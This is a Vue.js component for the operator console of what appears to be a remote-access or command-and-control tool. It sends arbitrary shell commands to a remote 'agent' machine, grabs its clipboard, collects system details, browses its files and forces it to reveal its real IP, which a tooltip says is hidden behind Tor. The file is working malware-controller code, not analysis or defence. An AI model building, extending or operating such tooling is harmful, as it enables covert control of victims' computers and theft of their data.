<template>
    <v-dialog
        v-model="dialog"
        transition="dialog-bottom-transition"
        fullscreen
        :scrim="false"
    >

        <template v-slot:activator="{ props: activatorProps }">
            <v-btn
                variant="plain"
                density="compact"
                v-bind="activatorProps"
                @click.stop="selected"
            >
                <v-icon icon="mdi-console" />

                <v-tooltip activator="parent" location="top" open-delay="600">
                    <div class="tooltip-el">
                        <h4>Open Agent's Dialog</h4>
                        Opens up a dialog used for interacting with an agent.
                        This includes access to shell terminal, file browser, etc... 
                    </div>
                </v-tooltip>
            </v-btn>
        </template>

        <v-card class="liquid-glass" density="compact" >
            <v-toolbar density="compact" class="liquid-glass">
                <v-toolbar-items>
                    <v-btn
                        @click="systemDetailsCommand"
                        variant="plain"
                        density="compact"
                    >
                        <v-icon icon="mdi-card-account-details" />

                        <v-tooltip activator="parent" location="top" open-delay="600">
                            <div class="tooltip-el">
                                <h4>System Details</h4>
                                Makes an agent return information about CPU, RAM, networks, etc...
                            </div>
                        </v-tooltip>
                    </v-btn>

                    <FileExplorerAgentDialog
                        :agentId="props.agentId"
                    />

                    <FileSearchDialog
                        :agentId="props.agentId"
                    />

                    <!-- <v-btn
                        variant="plain"
                        density="compact"
                    >
                        <v-icon icon="mdi-monitor-screenshot" />

                        <v-tooltip activator="parent" location="top" open-delay="600">
                            <div class="tooltip-el">
                                <h4>Take Screenshot</h4>
                                Takes screenshot of the agent's computer.
                            </div>
                        </v-tooltip>
                    </v-btn> -->

                    <v-btn
                        @click="grabClipboardCommand"
                        variant="plain"
                        density="compact"
                    >
                        <v-icon icon="mdi-clipboard-arrow-down" />

                        <v-tooltip activator="parent" location="top" open-delay="600">
                            <div class="tooltip-el">
                                <h4>Grab Clipboard</h4>
                                Read text copied into the clipboard.
                            </div>
                        </v-tooltip>
                    </v-btn>

                    <v-btn
                        @click="getRealIpCommand"
                        variant="plain"
                        density="compact"
                    >
                        <v-icon icon="mdi-ip" />

                        <v-tooltip activator="parent" location="top" open-delay="600">
                            <div class="tooltip-el">
                                <h4>Real IP</h4>
                                Makes the agent reach out to predefined API that would return
                                its IP address, then agent would send the IP back to us. This
                                is useful as via Tor we can't actually know IP of an agent.
                            </div>
                        </v-tooltip>
                    </v-btn>
                </v-toolbar-items>

                <v-spacer />

                <v-btn
                    icon="mdi-close"
                    @click="dialog = false"
                ></v-btn>
            </v-toolbar>

            <div ref="terminalOutput" class="terminal-output ma-2">
                <p
                    v-for="msg in API.store.messages.data"
                    :data="msg.id"
                >
                    <h4>
                        <v-icon icon="mdi-console-line" class="mr-1 pb-1" />
                        {{ msg.request }}
                    </h4>
                    {{ msg.response }}
                </p>
            </div>

            <v-card-actions class="terminal-actions">
                <v-text-field
                    ref="terminalInput"
                    v-model="command"
                    variant="outlined"
                    density="compact"
                    placeholder="Send Command"
                    :loading="loading"
                    :disabled="loading"
                    @keyup.enter="sendCommand"
                />

                <v-btn
                    @click="toggleExecutionAwaiting"
                    variant="plain"
                    class="mb-5"
                >
                    <v-icon v-if="awaitExecution" icon="mdi-timer" />
                    <v-icon v-else icon="mdi-timer-off-outline" />

                    <v-tooltip activator="parent" location="top" open-delay="600">
                        <div class="tooltip-el">
                            <h4>Await Command ({{ awaitExecution ? 'enabled' : 'disabled' }})</h4>
                            When enabled it would await command to finish and return its output,
                            however, when disabled it would just run the command without blocking
                            the process and won't return its output.
                        </div>
                    </v-tooltip>
                </v-btn>
            </v-card-actions>

        </v-card>

    </v-dialog>
</template>

<script setup lang="ts">
import { shallowRef } from 'vue'

const props = defineProps<{
    agentId: string
}>()

const dialog = shallowRef(false)
const awaitExecution = ref(true)
const command = ref('')
const loading = ref(false)
const terminalOutput = ref() as Ref<HTMLElement | HTMLElement>
const terminalInput = ref() as Ref<HTMLElement | HTMLElement>

const commands = {
    REAL_IP: () => `/get-ip`,
    READ_CLIPBOARD: () => `/read-clipboard`,
    SYSTEM_DETAILS: () => `/system-details`,
    RUN_NO_AWAIT: (command: string) => `/run|${command}`,
} as const

const toggleExecutionAwaiting = () => {
    awaitExecution.value = !awaitExecution.value
}

const scrollToBottom = async () => {
    await nextTick() // Wait for DOM updates
    if (terminalOutput.value) {
        // Force layout recalculation
        terminalOutput.value.offsetHeight // Trigger reflow
        terminalOutput.value.scrollTop = terminalOutput.value.scrollHeight
    }
}

const getRealIpCommand = async () => {
    loading.value = true

    try {
        await API.value.sendMessage(props.agentId, commands.REAL_IP())
        await scrollToBottom()
    } catch(e) {
        console.error('failed to send message:', e)
        // TODO: Issue visual error notification.
    } finally {
        loading.value = false
    }

    await fetchMessages()
}

const systemDetailsCommand = async () => {
    loading.value = true

    try {
        await API.value.sendMessage(props.agentId, commands.SYSTEM_DETAILS())
        await scrollToBottom()
    } catch(e) {
        console.error('failed to send message:', e)
        // TODO: Issue visual error notification.
    } finally {
        loading.value = false
    }

    await fetchMessages()
}

const grabClipboardCommand = async () => {
    loading.value = true

    try {
        await API.value.sendMessage(props.agentId, commands.READ_CLIPBOARD())
        await scrollToBottom()
    } catch(e) {
        console.error('failed to send message:', e)
        // TODO: Issue visual error notification.
    } finally {
        loading.value = false
    }

    await fetchMessages()
}

const sendCommand = async () => {
    if (command.value.length === 0) {
        return
    }

    loading.value = true

    try {
        await API.value.sendMessage(
            props.agentId, 
            awaitExecution.value === true
                ? command.value
                : commands.RUN_NO_AWAIT(command.value)
        )
        command.value = ''
        await scrollToBottom()
    } catch(e) {
        console.error('failed to send message:', e)
        // TODO: Issue visual error notification.
    } finally {
        loading.value = false
    }

    await fetchMessages()

    if (terminalInput && terminalInput.value) {
        await nextTick()
        terminalInput.value.focus()
    }
}

const fetchMessages = async () => {
    const newMessages = await API.value.fetchMessages(props.agentId, { page: 0, before: undefined, after: API.value.store.messages.after })
    if (newMessages.messages.length !== 0) {
        API.value.store.messages.after = newMessages.after
        API.value.store.messages.data = [ ...API.value.store.messages.data, ...newMessages.messages, ] as Message[]
        await scrollToBottom()
    }
}

const terminalOutputFullyScrolled = () => terminalOutput.value.scrollTop + terminalOutput.value.clientHeight >= terminalOutput.value.scrollHeight

const selected = async () => {
    API.value.clearMessages()
    API.value.store.messages.newMessageCallback = async () => {
        await scrollToBottom()
    }
    API.value.store.messages.agentId = props.agentId
    const messages = await API.value.fetchMessages(props.agentId, { page: 0, before: undefined, after: undefined })
    API.value.store.messages.data = messages.messages
    API.value.store.messages.before = messages.before
    API.value.store.messages.after = messages.after
    await scrollToBottom()

    setInterval(async () => {
        if (!terminalOutput || !terminalOutput.value) {
            return
        }
        const newMessages = await API.value.fetchMessages(props.agentId, { page: 0, before: undefined, after: API.value.store.messages.after })
        if (newMessages.messages.length !== 0) {
            API.value.store.messages.after = newMessages.after
            API.value.store.messages.data = [ ...API.value.store.messages.data, ...newMessages.messages, ] as Message[]
            if (terminalOutputFullyScrolled() === true) {
                await scrollToBottom()
            }
        }

        const messagesWithoutResponses = API.value.store.messages.data
            .filter(msg => !msg.response.length)
            .map(msg => msg.id)

        const msgMap = await API.value.fetchMessagesByIds(messagesWithoutResponses)
        API.value.store.messages.data.forEach(msg => {
            if (!msg) {
                return
            }
            if (msg.response.length !== 0) {
                return
            }
            msg.response = msgMap[msg.id]?.response as string
        })

        if (terminalOutputFullyScrolled() === true) {
            await scrollToBottom()
        }
    }, 3000)

    if (terminalOutput.value) {
        let cooloff = false
        terminalOutput.value.addEventListener('scroll', async (e) => {
            if (cooloff === true) {
                return
            }

            const element = e.target as HTMLElement

            if (element.scrollTop > 150) {
                return
            }

            try {
                cooloff = true
                
                const olderMessages = await API.value.fetchMessages(props.agentId, { page: undefined, before: API.value.store.messages.before, after: undefined })
                if (olderMessages.messages.length !== 0) {
                    const before = element.scrollHeight
                    API.value.store.messages.before = olderMessages.before
                    API.value.store.messages.data = [ ...olderMessages.messages, ...API.value.store.messages.data ] as Message[]
                    await nextTick()
                    terminalOutput.value.offsetHeight // Trigger reflow
                    terminalOutput.value.scrollTop = terminalOutput.value.scrollHeight - before
                }
            } catch(e) {
                console.error('failed to fetch messages:', e)
            } finally {
                setTimeout(() => cooloff = false, 500)
            }
        })
    }
}

</script>

<style scoped>
.terminal-output {
    height: 100%;
    max-height: 100%;
    overflow-y: auto;
    white-space: pre-line;
    display: flex;
    flex-direction: column;
    gap: 16px;
}

.terminal-actions {
    padding-bottom: 0px;
}
</style>